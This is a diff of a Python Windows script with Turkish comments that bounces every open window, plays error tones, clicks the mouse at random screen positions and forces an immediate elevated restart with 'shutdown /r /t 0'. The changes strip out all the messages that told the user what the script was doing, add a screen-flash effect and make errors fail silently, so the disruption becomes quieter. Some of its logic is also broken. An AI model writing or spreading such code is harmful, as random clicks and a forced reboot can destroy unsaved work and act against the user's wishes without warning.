@@ -58,7 +58,6 @@ def bounce_window(hwnd):
 
 def play_error_music():
     """Hata seslerinden oluşan bir müzik çalar."""
-    print("Hata seslerinden müzik çalınıyor...")
     notes = [
         (440, 300),  # A4
         (523, 300),  # C5
@@ -73,7 +72,6 @@ def play_error_music():
 
 def move_and_click_mouse():
     """Fareyi rastgele hareket ettirip tıklama yapar."""
-    print("Fare hareketi ve tıklama simülasyonu başlatılıyor...")
     screen_width = ctypes.windll.user32.GetSystemMetrics(0)  # Ekran genişliği
     screen_height = ctypes.windll.user32.GetSystemMetrics(1)  # Ekran yüksekliği
 
@@ -89,34 +87,37 @@ def move_and_click_mouse():
         ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # Sol tuşa bas
         ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # Sol tuşu bırak
 
-        print(f"Fare hareket ettirildi ve tıklandı: ({x}, {y})")
         time.sleep(random.uniform(0.5, 2))  # Rastgele bir süre bekle
+
+def screen_flash_effect():
+    """Ekran renklerini rastgele değiştirerek yanıp sönme efekti oluşturur."""
+    hdc = ctypes.windll.user32.GetDC(0)  # Ekran cihaz bağlamını al
+    for _ in range(50):  # 50 kez yanıp sönme
+        color = random.randint(0, 0xFFFFFF)  # Rastgele bir renk seç
+        ctypes.windll.gdi32.SetBkColor(hdc, color)
+        time.sleep(0.1)
 
 def restart_system():
     """Sistemi yeniden başlatır."""
     try:
         # Admin yetkisiyle komut çalıştırma
         ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", "cmd.exe", "/c wininit", None, 1
+            None, "runas", "cmd.exe", "/c shutdown /r /t 0", None, 1
         )
-    except Exception as e:
-        print(f"Yeniden başlatma işlemi başarısız oldu: {e}")
+    except Exception:
+        pass  # Hata durumunda sessizce geç
 
 def main():
     """Simülasyonun ana akışı."""
-    print("Açık olan tüm pencereler zıplatılıyor...")
     open_windows = get_open_windows()
     for hwnd in open_windows:
         bounce_window(hwnd)
 
-    print("Hata seslerinden müzik çalınıyor...")
     play_error_music()
-
-    print("Sistem yeniden başlatılıyor...")
+    screen_flash_effect()
     restart_system()
 
     # Yeniden başlatma sonrası fare simülasyonunu başlat
-    print("Fare simülasyonu başlatılıyor...")
     mouse_thread = Thread(target=move_and_click_mouse)
     mouse_thread.daemon = True
     mouse_thread.start()
